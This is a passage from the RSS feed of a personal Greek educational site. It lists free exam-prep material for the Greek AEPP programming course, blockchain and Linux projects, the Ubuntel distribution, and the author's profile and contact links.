&lt;p>&lt;img src="/img/bc_cli.jpg" alt="">&lt;/p></content></item><item><title/><link>/lyseis_aepp/content/panellinies.aepp_lyseis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/lyseis_aepp/content/panellinies.aepp_lyseis/</guid><description>Panellinies_AEPP Λύσεις θεμάτων ./</description><content>&lt;p>Panellinies_AEPP
Λύσεις θεμάτων ./&lt;/p></content></item><item><title/><link>/panellinies.aepp_ask/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/panellinies.aepp_ask/</guid><description>Προσοχή: Από τις 28 Δεκεμβρίου το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό. Τo Project πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας σε Basic Attention Token (BAT) μέσω του Brave Browser στο κανάλι στο Youtube καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:
Bitcoin: bc1q6j959m3whh44ztr8k6p7545n5pzcsncple7qmy
Ethereum: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873
Cardano: addr1qxewtm0y5yk2mgf93ct4ghguus2shu34fu786t62j3tv7296evenhmr0ltmx3hdyw4d6d8gj8qspry5pe3raaw4nu8as7jsr9l
Monero: 46ewn3rgXMSceuEUEng1bze1RzG61rEiFV3hJ6VKuzvHU62jPntydJRBcFinQ62Pad8AvdoX9YbQcY5HKX3Cr3UQPkhiQ4L
VeChain:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873
Shiba:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873
AIOZ:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873
Για το πώς θα κερδίσετε δωρεάν BAT, διαβάστε αυτό το άρθρο κάνοντας κλικ εδώ</description><content>&lt;p>&lt;img src="/img/brave.png" alt="">&lt;/p>
&lt;p>Προσοχή: Από τις 28 Δεκεμβρίου το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό.
Τo Project πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας σε Basic Attention Token (BAT) μέσω του Brave Browser &lt;a href="https://www.youtube.com/LinuxOSblog/">στο κανάλι στο Youtube&lt;/a> καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:&lt;/p>
&lt;p>Bitcoin: bc1q6j959m3whh44ztr8k6p7545n5pzcsncple7qmy&lt;/p>
&lt;p>Ethereum: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Cardano: addr1qxewtm0y5yk2mgf93ct4ghguus2shu34fu786t62j3tv7296evenhmr0ltmx3hdyw4d6d8gj8qspry5pe3raaw4nu8as7jsr9l&lt;/p>
&lt;p>Monero: 46ewn3rgXMSceuEUEng1bze1RzG61rEiFV3hJ6VKuzvHU62jPntydJRBcFinQ62Pad8AvdoX9YbQcY5HKX3Cr3UQPkhiQ4L&lt;/p>
&lt;p>VeChain:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Shiba:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>AIOZ:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Για το πώς θα κερδίσετε δωρεάν BAT, διαβάστε αυτό το άρθρο κάνοντας κλικ &lt;a href="https://cerebrux.net/2021/02/25/brave-bat-token/">εδώ&lt;/a>&lt;/p>
&lt;hr>
&lt;h1 id="season-3">Season 3:&lt;/h1>
&lt;h1 id="θέματα-αβ-">Θέματα Α+Β :&lt;/h1>
&lt;p>&lt;a href="/PDFs/askhseisA+B/panellinies_aepp_a+b_1.pdf"> Θέματα Α+Β - Part1&lt;/a>&lt;/p>
&lt;p>&lt;a href="/PDFs/askhseisA+B/panellinies_aepp_a+b_1.pdf">Θέματα Α+Β - Part2&lt;/a>&lt;/p>
&lt;h1 id="θέματα-γδ-">Θέματα Γ+Δ :&lt;/h1>
&lt;p>&lt;a href="/PDFs/askhseisG+D/panellinies_aepp_g+d_1.pdf">Θέματα Γ+Δ - Part1&lt;/a>&lt;/p>
&lt;p>&lt;a href="/PDFs/askhseisG+D/panellinies_aepp_g+d_2.pdf">Θέματα Γ+Δ - Part2&lt;/a>&lt;/p>
&lt;p>&lt;a href="/PDFs/askhseisG+D/panellinies_aepp_g+d_3.pdf">Θέματα Γ+Δ - Part3&lt;/a>&lt;/p>
&lt;h1 id="διαγωνίσματα-προσομοίωσης">Διαγωνίσματα προσομοίωσης:&lt;/h1>
&lt;p>&lt;a href="/PDFs/askhseisG+D/test1.pdf">Διαγώνισμα Προσωμοίωσης &lt;/a>&lt;/p>
&lt;h2 id="iστορικό">Iστορικό:&lt;/h2>
&lt;hr>
&lt;p>SEASON 2:&lt;/p>
&lt;p>ΘΕΜΑΤΑ Α ΚΑΙ Β :&lt;/p>
&lt;p>Φυλλάδιο 00 - Εισαγωγικές Ασκήσεις στον κόσμο του ΑΕΠΠ&lt;/p>
&lt;p>Θέματα Α και Β - 2ο PDF&lt;/p>
&lt;p>ΘΕΜΑΤΑ Γ ΚΑΙ Δ :&lt;/p>
&lt;p>Φυλλάδιο 00 - Δομές Επιλογής-Επανάληψης
Θέματα Γ και Δ - 2ο PDF - Δομές Δεδομένων:Πίνακες
Θέματα Γ και Δ - 3o PDF - Ασκήσεις στα Υποπρογράμματα&lt;/p>
&lt;p>Διαγώνισμα Προσομοίωσης Πανελληνίων στην Ανάπτυξη Εφαρμογών σε Προγραμματιστικό Περιβάλλον.&lt;/p>
&lt;p>SEASON 1:&lt;/p>
&lt;p>Φυλλάδιο 00 - Δομές Επιλογής-Επανάληψης
Φυλλάδιο 01 - Μονοδιάστατοι πίνακες &amp;amp; Ιδιότητες Πινάκων
Φυλλάδιο 02 - Δισδιάστατοι πίνακες
Φυλλάδιο 03 - Υποπρογράμματα
Τελικές Ασκήσεις
1ο διαγώνισμα προσομοίωσης&lt;/p></content></item><item><title/><link>/panellinies.aepp_theoria/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/panellinies.aepp_theoria/</guid><description>⚠️ Προσοχή: Από τις 28 Δεκεμβρίου 2021, το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό.
🔰 Τo Project Panellinies_AEPP πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας μέσω YouTube και σε Basic Attention Token (BAT) μέσω του Brave Browser στο κανάλι στο Youtube, καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:
🔷 Bitcoin: bc1q6j959m3whh44ztr8k6p7545n5pzcsncple7qmy 🔷 Ethereum: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873 🔷 Cardano: addr1qxewtm0y5yk2mgf93ct4ghguus2shu34fu786t62j3tv7296evenhmr0ltmx3hdyw4d6d8gj8qspry5pe3raaw4nu8as7jsr9l 🔷 Monero: 46ewn3rgXMSceuEUEng1bze1RzG61rEiFV3hJ6VKuzvHU62jPntydJRBcFinQ62Pad8AvdoX9YbQcY5HKX3Cr3UQPkhiQ4L 🔷 VeChain:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873 🔷 Shiba:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873 🔷 AIOZ:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873</description><content>&lt;p>⚠️ &lt;strong>Προσοχή&lt;/strong>: Από τις 28 Δεκεμβρίου 2021, το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό.&lt;/p>
&lt;p>🔰 Τo Project Panellinies_AEPP πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας μέσω YouTube και σε Basic Attention Token (BAT) μέσω του Brave Browser &lt;a href="https://www.youtube.com/@TuxHouseEdu">στο κανάλι στο Youtube&lt;/a>, καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:&lt;/p>
&lt;p>🔷 Bitcoin: bc1q6j959m3whh44ztr8k6p7545n5pzcsncple7qmy
🔷 Ethereum: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873
🔷 Cardano: addr1qxewtm0y5yk2mgf93ct4ghguus2shu34fu786t62j3tv7296evenhmr0ltmx3hdyw4d6d8gj8qspry5pe3raaw4nu8as7jsr9l
🔷 Monero: 46ewn3rgXMSceuEUEng1bze1RzG61rEiFV3hJ6VKuzvHU62jPntydJRBcFinQ62Pad8AvdoX9YbQcY5HKX3Cr3UQPkhiQ4L
🔷 VeChain:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873
🔷 Shiba:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873
🔷 AIOZ:0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Για το πώς θα κερδίσετε δωρεάν BAT, διαβάστε αυτό το άρθρο κάνοντας κλικ &lt;a href="https://cerebrux.net/2021/02/25/brave-bat-token/">εδώ&lt;/a>&lt;/p>
&lt;p>&lt;img src="/img/brave.png" alt="">&lt;/p>
&lt;hr>
&lt;h2 id="-season-4">📚 Season 4:&lt;/h2>
&lt;h1 id="η-θεωρία-του-αεππ---part1pdfstheoriapanellinies_aepp_theoria_part1pdf">&lt;a href="/PDFs/theoria/panellinies_aepp_theoria_part1.pdf">Η Θεωρία του ΑΕΠΠ - Part1&lt;/a>&lt;/h1>
&lt;h1 id="η-θεωρία-του-αεππ---part2pdfstheoriapanellinies_aepp_theoria_part2pdf">&lt;a href="/PDFs/theoria/panellinies_aepp_theoria_part2.pdf">Η Θεωρία του ΑΕΠΠ - Part2&lt;/a>&lt;/h1>
&lt;h1 id="η-θεωρία-του-αεππ---part3pdfstheoriapanellinies_aepp_theoria_part3pdf">&lt;a href="/PDFs/theoria/panellinies_aepp_theoria_part3.pdf">Η Θεωρία του ΑΕΠΠ - Part3&lt;/a>&lt;/h1>
&lt;h1 id="η-θεωρία-του-αεππ---πίνακεςpdfstheoriapanellinies_aepp_theoria_arrayspdf">&lt;a href="/PDFs/theoria/panellinies_aepp_theoria_arrays.pdf">Η Θεωρία του ΑΕΠΠ - Πίνακες&lt;/a>&lt;/h1>
&lt;h1 id="η-θεωρία-του-αεππ---υποπρογράμματαpdfstheoriapanellinies_aepp_theoria_ypoprogrammatapdf">&lt;a href="/PDFs/theoria/panellinies_aepp_theoria_ypoprogrammata.pdf">Η Θεωρία του ΑΕΠΠ - Υποπρογράμματα&lt;/a>&lt;/h1>
&lt;h1 id="η-θεωρία-του-αεππ---προηγμένες-δομές-δεδομένωνpdfstheoriapanellinies_aepp_theoria_datastrpdf">&lt;a href="/PDFs/theoria/panellinies_aepp_theoria_datastr.pdf">Η Θεωρία του ΑΕΠΠ - Προηγμένες Δομές Δεδομένων&lt;/a>&lt;/h1>
&lt;h1 id="η-θεωρία-του-αεππ---debugging-και-αντικειμενοστραφής-προγραμματισμόςpdfstheoriapanellinies_aepp_theoria_debugpdf">&lt;a href="/PDFs/theoria/panellinies_aepp_theoria_debug.pdf">Η Θεωρία του ΑΕΠΠ - Debugging και Αντικειμενοστραφής Προγραμματισμός&lt;/a>&lt;/h1>
&lt;h1 id="270-σωστό-λάθος-λυμένα---5η-έκδοσηpdfsswsto_lathospdf">&lt;a href="/PDFs/swsto_lathos.pdf">270+ Σωστό Λάθος Λυμένα - 5η έκδοση&lt;/a>&lt;/h1>
&lt;h1 id="όλη-η-θεωρία-του-αεππ---4η-έκδοσηpdfstheoriapanellinies_aepp_theoria_fullpdf">&lt;a href="/PDFs/theoria/panellinies_aepp_theoria_full.pdf">ΌΛΗ Η Θεωρία του ΑΕΠΠ - 4η έκδοση&lt;/a>&lt;/h1>
&lt;hr>
&lt;p>🎯 Στόχος του Panellinies_AEPP είναι να προσφέρει λυμένες ασκήσεις και κατηγοριοποιημένη την Θεωρία του ΑΕΠΠ, τόσο σε άτομα που δεν έχουν την οικονομική δυνατότητα για φροντιστήρια, όσο και σε άτομα που θέλουν να δουν το &amp;ldquo;κάτι παραπάνω&amp;rdquo; και να κάνουν περισσότερη εξάσκηση.&lt;/p>
&lt;p>🔗 Όλο το υλικό μπορεί να βρεθεί κάνοντας click στο Panellinies_AEPP στο &lt;a href="https://sv1sjp.github.io/">https://sv1sjp.github.io/&lt;/a>&lt;/p>
&lt;hr>
&lt;p>🎓 TuxHouse is an Educational community which aims to teach people about Linux, Blockchain, Android &amp;amp;&amp;amp; Cybersecurity using the new technologies and trends. Stay tuned for more educational content.&lt;/p>
&lt;p>Feel free to contact me on any social media as: @TuxHouse &amp;amp;&amp;amp; @sv1sjp&lt;/p>
&lt;p>🌐 Let&amp;rsquo;s educate the world!&lt;/p>
&lt;hr>
&lt;p>🔵 YouTube: &lt;a href="https://www.youtube.com/@TuxHouseEdu">https://www.youtube.com/@TuxHouseEdu&lt;/a>&lt;/p>
&lt;p>🔵 TikTok: &lt;a href="https://www.tiktok.com/@tuxhouseedu">https://www.tiktok.com/@tuxhouse&lt;/a>&lt;/p>
&lt;p>🔵 Instagram: &lt;a href="https://www.instagram.com/sv1sjp">https://www.instagram.com/tuxhouseedu&lt;/a>&lt;/p>
&lt;p>🔵 LBRY: &lt;a href="https://odysee.com/@TuxHouse:1">https://odysee.com/@TuxHouse:1&lt;/a>&lt;/p>
&lt;p>🔵 Mastodon: &lt;a href="https://fosstodon.org/@sv1sjp">https://fosstodon.org/@sv1sjp&lt;/a>&lt;/p>
&lt;p>More social media can be found in the &lt;a href="https://sv1sjp.github.io/whoami">whoami&lt;/a> section.&lt;/p>
&lt;p>&lt;img src="/img/tuxhouse_logo_with_name.png" alt="">&lt;/p></content></item><item><title/><link>/projects/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/projects/</guid><description>There are multiple projects running on TuxHouse as well as in other communities. On this Page I will try to achieve all the Projects I run into a single page. For any information, you can find all my social media on whoami section. Educational Series: 🇬🇧 These eLearning Series can be found both on YouTube and LBRY free of cost. If you want to support the Channel, you can like &amp;amp;&amp;amp; subscribe to both channels (on YouTube and LBRY).</description><content>&lt;pre tabindex="0">&lt;code>There are multiple projects running on TuxHouse as well as in other communities.
On this Page I will try to achieve all the Projects I run into a single page.
For any information, you can find all my social media on whoami section.
&lt;/code>&lt;/pre>&lt;h1 id="educational-series">Educational Series:&lt;/h1>
&lt;p>&lt;img src="/img/series.jpg" alt="">&lt;/p>
&lt;p>🇬🇧 These eLearning Series can be found both on YouTube and LBRY free of cost. If you want to support the Channel, you can like &amp;amp;&amp;amp; subscribe to both channels (on YouTube and LBRY).&lt;/p>
&lt;p>🇬🇷 Οι εκπαιδευτικές σειρές που βρίσκονται σε αυτή την λίστα μπορούν να βρεθούν στο LBRY και YouTube εντελώς δωρεάν. Ένα Like &amp;amp;&amp;amp; μία εγγραφή μπορούν να βοηθήσουν το Project να εξελιχθεί σε κάτι μεγαλύτερο!&lt;/p>
&lt;ul>
&lt;li>🇬🇷 Linux for Beginners (Greek): &lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWx2Xt4spOOlxKzGJa5FFmoV">YouTube&lt;/a>&lt;/li>
&lt;li>🇬🇷 Ultimate UNIX Ultimate Tutorial (Greek): &lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzfu1kLBWBbj-3wdKSzDVl4">YouTube&lt;/a> , &lt;a href="https://odysee.com/@TuxHouse:1/ultimate_linux_terminal_tutorial_greek_part1:e?lid=9590f4f28cecd27d8e9414a284ae9296e3a0a81f">LBRY&lt;/a>&lt;/li>
&lt;li>🇬🇷 Smart-Contract Security (Greek): &lt;a href="https://www.youtube.com/watch?v=kmlhkMLF8yk&amp;amp;list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">YouTube&lt;/a> , &lt;a href="https://odysee.com/$/playlist/35cdd869a31e31b26c6a95b3261155a3215243ba">LBRY&lt;/a>&lt;/li>
&lt;li>🇬🇷 Information Theory (Greek): &lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzq3tyDlMqUmVzd1a7zDpT-">YouTube&lt;/a> , &lt;a href="https://odysee.com/$/playlist/9793029be347028f406fa73c0c2a2797fff50b9b">LBRY&lt;/a>&lt;/li>
&lt;li>🇬🇷 Panellinies_AEPP: Δωρεάν Ασκήσεις και κατηγοριοποιημένη η θεωρία του ΑΕΠΠ για τις Πανελλήνιες: &lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWxh-699iV33AzR6LNPD26nt">YouTube&lt;/a>&lt;/li>
&lt;li>🇬🇧 Android Hacking (English): &lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWwXANQuJdggsb-aq2kN4lT9">YouTube&lt;/a>&lt;/li>
&lt;li>🇬🇧 Android Rooting &amp;amp;&amp;amp; Customization (English): &lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzrT4Yig-z__LvhvaWsBkhv">YouTube&lt;/a>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h1 id="blockchain-projects">Blockchain Projects:&lt;/h1>
&lt;h2 id="developing-an-ethereum-based-blockchain-camera">Developing an Ethereum Based Blockchain Camera&lt;/h2>
&lt;p>Turn your Raspberry Pi into an Ethereum-based Blockchain Camera! Powered by Solidity and Python3.&lt;/p>
&lt;ul>
&lt;li>Find more information about Blockchain Camera on is own web page.&lt;a href="https://sv1sjp.github.io/blockchain_camera/">Click Here:&lt;/a> or read Blockchain&amp;rsquo;s Camera paper:&lt;/li>
&lt;/ul>
&lt;p>&lt;a href="https://github.com/sv1sjp/Blockchain_Camera/blob/main/Blockchain_Camera.pdf">Developing an Ethereum Based Blockchain Camera: Dimitris Vagiakakos (2022)&lt;/a>&lt;/p>
&lt;h2 id="evoting_elections_decentralized_app">eVoting_Elections_Decentralized_App&lt;/h2>
&lt;p>eVoting Decentralized Application for the Ethereum Network written in Solidity 0.8.x&lt;/p>
&lt;ul>
&lt;li>For more information about how you can deploy and how our eVoting Decentralized Application works, please read our paper:&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/eVoting_Smart_Contract_paper.pdf">Developing a Blockchain eVoting Application using Ethereum: Dimitris Vagiakakaos, Konstantinos Karahalis, Stavros Gkinos&lt;/a>&lt;/p>
&lt;hr>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf">Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="other-projects">Other Projects:&lt;/h1>
&lt;h2 id="ubuntel-linux----the-greek-version-of-ubuntu">Ubuntel Linux 🇬🇷 - The Greek Version of Ubuntu&lt;/h2>
&lt;ul>
&lt;li>Find more information about Ubuntel Linux on &lt;a href="https://sv1sjp.github.io/ubuntel/">its own web page.&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="-privacy-in-blockchain-and-web30---second-edition-book">🇬🇷 Privacy in Blockchain and Web3.0 - Second Edition (Book):&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/Privacy%20in%20Blockchain%20and%20Web3.0%20(Greek).pdf"> Privacy in Blockchain and Web3.0 - Second Edition: Dimitris Vagiakakakos, Konstantinos Karahalis, Stavros Gkinos&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title/><link>/ubuntel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/ubuntel/</guid><description>Το Ubuntel είναι η ελληνική έκδοση του Ubuntu με MATE για desktop.
Ξεκίνησε επίσημα τον Οκτώβρη του 2011 από τον 11 χρονών τότε Δημήτρη Βαγιακάκο βασιζόμενο σε Ubuntu 11.10!
Σκοπός της διανομής είναι να προσφέρει ό,τι μπορεί να χρειαστεί ένας χρήστης,από τον αρχάριο μέχρι &amp;amp; τον παραγωγό μουσικής/video editor ή τον hardcore χρήστη ,σε μόλις ένα bootable DVD ή USB flash !Χρησιμοποιόντας MATE,γίνεται πιο φιλικό για παλιότερο υλικό,ως αποτέλεσμα να αποτελεί μια καλή λύση για να ζωντανέψετε τα παλιά σας PC !</description><content>&lt;p>&lt;img src="/img/ubuntel.jpg" alt="https://www.youtube.com/linuxosblog">
Το Ubuntel είναι η ελληνική έκδοση του Ubuntu με MATE για desktop.&lt;/p>
&lt;p>Ξεκίνησε επίσημα τον Οκτώβρη του 2011 από τον 11 χρονών τότε Δημήτρη Βαγιακάκο βασιζόμενο σε Ubuntu 11.10!&lt;/p>
&lt;p>Σκοπός της διανομής είναι να προσφέρει ό,τι μπορεί να χρειαστεί ένας χρήστης,από τον αρχάριο
μέχρι &amp;amp; τον παραγωγό μουσικής/video editor ή τον hardcore χρήστη ,σε μόλις ένα
bootable DVD ή USB flash !Χρησιμοποιόντας MATE,γίνεται πιο φιλικό για παλιότερο υλικό,ως
αποτέλεσμα να αποτελεί μια καλή λύση για να ζωντανέψετε τα παλιά σας PC ! Επιπλέον ,διαθέτει την δυνατότητα εγκατάσταστασης στον υπολογιστή σας.&lt;/p>
&lt;p>Στην έκδοση 5.0 - V - (Aigio) του Ubuntel θα βρείτε :&lt;/p>
&lt;ul>
&lt;li>Βασισμένο στο Linux Mint Mate 19.1 &amp;amp; περιλαμβάνει ΟΛΕΣ τις ενημερώσεις που είχαν κυκλοφορήσει μέχρι 1 Απριλίου 2019. Λόγω LTS (Long Time Support) ,θα λαμβάνει ενημερώσεις μέχρι τον Απρίλιο του 2023! Έπειτα, προτείνεται η ενημέρωση του σε επόμενο versioning του Linux Mint. Το Ubuntel χρησιμοποιεί τα αποθετήρια του Linux Mint συνεπώς οι ενημερώσεις μπορούν να γίνονται κανονικά,&lt;/li>
&lt;li>Πλέον το Ubuntel χρησιμοποιεί το ΜΑΤΕ ως γραφικό περιβάλλον με αρκετά νέα χαρακτηριστικά και επανασχεδιασμό ,ώστε να προσφέρει στον χρήστη μία πιο άνετη &amp;amp; γρήγορη εμπειρία&lt;/li>
&lt;li>Προστέθηκαν νέα Ραδιοερασιτεχνικά προγράμματα ,καθώς και υποστήριξη στο FT-8 , IDE για προγραμματισμό,pluma &amp;amp; πολλά hello world προγράμματα ως samples για αρκετές γλώσσες προγραμματισμού ,όπως Perl ,C, C++ ,Java,Python,Ruby,php κ.α,&lt;/li>
&lt;li>LibreOffice ,Abiword &amp;amp; Gnumeric &amp;amp; διάφορα εργαλεία υπολογισμών ( σε .xls &amp;amp; bash script) ,όπως μέσο όρο, πολλαπλάσια,υπολογισμό Πάσχα ,decimal to roman &amp;amp; reversed κτλπ. ,φτιαγμένα από τον Δημήτρη Βαγιακάκο,&lt;/li>
&lt;li>Web Browsers με προστασία παρακολούθησης,ώστε να μείνετε &amp;ldquo;Ανώνυμοι&amp;rdquo; ,αλλά &amp;amp; Tor Browser,&lt;/li>
&lt;li>Εφαρμογές επεξεργασίας βίντεο,ήχου,εικόνας (&amp;amp; Screen Recorder),&lt;/li>
&lt;li>Wine &amp;amp; PlayOnLinux για να απολαύσετε εφαρμογές των Windows ,αλλά &amp;amp; Games,&lt;/li>
&lt;li>Εκμάθηση προγραμματισμού σε οπτικό περιβάλλον με τη βοήθεια του Scratch,&lt;/li>
&lt;li>Eργαλεία όπως Gparted ,για να πάρετε backup τα αρχεία σας &amp;amp; να φτίαξετε partitions στον δίσκο,&lt;/li>
&lt;li>Link στις πληροφορίες του βίντεο :)&lt;/li>
&lt;/ul>
&lt;p>Επίσης, ευχαριστώ για τις δοκιμές και τις προτάσεις εφαρμογών τους:&lt;/p>
&lt;ul>
&lt;li>Nikos Vagiakakos ( SV1EIG )&lt;/li>
&lt;li>Κωνσταντίνος Γεροκώστας ( SV1SJH )&lt;/li>
&lt;li>Αποστόλης Κοκονός&lt;/li>
&lt;li>John Karvelas&lt;/li>
&lt;/ul>
&lt;p>Download Link υπάρχει στο βίντεο με το Review του Ubuntel 5.0 στο κανάλι του TuxHouse στο Youtube : &lt;a href="https://www.youtube.com/watch?v=MXzPXsKCXbc">https://www.youtube.com/watch?v=MXzPXsKCXbc&lt;/a>&lt;/p></content></item><item><title/><link>/whoami/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/whoami/</guid><description>$whoami
Dimitris Vagiakakos @sv1sjp 🏠 Founder of TuxHouseEdu 🔗 Blockchain Security Engineer 🔍 Penetration Tester at Grant Thornton Greece 🎓 Specializing in Educational Technologies 📸 Creator of Blockchain Camera 🐧 Moderating Linux-User.gr
MSc in Blockchain &amp;amp; Digital Currency at University Of Nicosia 🇪🇺🇨🇾 BSc in Digital Systems Security at University Of Piraeus 🇪🇺🇬🇷 From: Mani, Lakonia, Greece, EU 🇪🇺🇬🇷 Based in: Athens, Greece, EU 🇪🇺🇬🇷 Find me on: Platform ./ 🔗 LinkedIn 📸 Instagram 🍋 Lemmy 🐘 Mastodon 💬 Telegram 🐙 Github 📺 TuxHouse YouTube 🏠 TuxHouse LBRY 📸 TuxHouse Instagram 🎵 TuxHouse TikTok 🐧 Linux-User.</description><content>&lt;p>$whoami&lt;/p>
&lt;h1 id="dimitris-vagiakakos-sv1sjp">Dimitris Vagiakakos @sv1sjp&lt;/h1>
&lt;p>&lt;img src="/img/sv1sjp.jpg" alt="">&lt;/p>
&lt;p>🏠 Founder of TuxHouseEdu
🔗 Blockchain Security Engineer
🔍 Penetration Tester at Grant Thornton Greece
🎓 Specializing in Educational Technologies
📸 Creator of Blockchain Camera
🐧 Moderating Linux-User.gr&lt;/p>
&lt;pre tabindex="0">&lt;code>MSc in Blockchain &amp;amp; Digital Currency at University Of Nicosia 🇪🇺🇨🇾
BSc in Digital Systems Security at University Of Piraeus 🇪🇺🇬🇷
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>From: Mani, Lakonia, Greece, EU 🇪🇺🇬🇷
Based in: Athens, Greece, EU 🇪🇺🇬🇷
&lt;/code>&lt;/pre>&lt;h2 id="find-me-on">Find me on:&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Platform&lt;/th>
&lt;th>./&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>🔗 &lt;a href="https://www.linkedin.com/in/sv1sjp">LinkedIn&lt;/a>&lt;/td>
&lt;td>📸 &lt;a href="https://www.instagram.com/sv1sjp/">Instagram&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>🍋 &lt;a href="https://lemmy.world/u/sv1sjp">Lemmy&lt;/a>&lt;/td>
&lt;td>🐘 &lt;a href="https://fosstodon.org/@sv1sjp">Mastodon&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>💬 &lt;a href="https://t.me/sv1sjp">Telegram&lt;/a>&lt;/td>
&lt;td>🐙 &lt;a href="https://github.com/sv1sjp">Github&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>📺 &lt;a href="https://youtube.com/@TuxHouseEdu">TuxHouse YouTube&lt;/a>&lt;/td>
&lt;td>🏠 &lt;a href="https://odysee.com/@TuxHouse">TuxHouse LBRY&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>📸 &lt;a href="https://www.instagram.com/tuxhouseedu">TuxHouse Instagram&lt;/a>&lt;/td>
&lt;td>🎵 &lt;a href="https://www.tiktok.com/@tuxhouseedu">TuxHouse TikTok&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>🐧 &lt;a href="https://linux-user.gr/u/sv1sjp">Linux-User.gr&lt;/a>&lt;/td>
&lt;td>📻 &lt;a href="https://www.qrz.com/db/sv1sjp">QRZ&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>💬 &lt;a href="https://discordapp.com/users/sv1sjp">Discord&lt;/a>&lt;/td>
&lt;td>📡 &lt;a href="https://matrix.to/#/@sv1sjp:matrix.org">Matrix&lt;/a>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>You don&amp;rsquo;t have anything from all of these? Well, you can send me an email:&lt;/p>
&lt;pre tabindex="0">&lt;code>dimitrislinuxos@protonmail.ch
&lt;/code>&lt;/pre>&lt;p>?? Do you need to use encryption? You can find my PGP public key &lt;a href="/PDFs/pgp.txt">here:&lt;/a>&lt;/p>
&lt;hr>
&lt;h2 id="other-information">Other Information:&lt;/h2>
&lt;h3 id="noticable-projects">Noticable Projects:&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://sv1sjp.github.io/blockchain_camera/">Developing an Ethereum Based Blockchain Camera&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Ethereum Hacking - Smart Contract Security Series&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzfu1kLBWBbj-3wdKSzDVl4">Ultimate Linux Terminal Tutorial Series (Greek)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzq3tyDlMqUmVzd1a7zDpT-">Information Theory Series&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sv1sjp.github.io/panellinies_aepp/index.html">Panellinies_AEPP&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="/img/Blockchain_Camera_EN.jpg" alt="">&lt;/p>
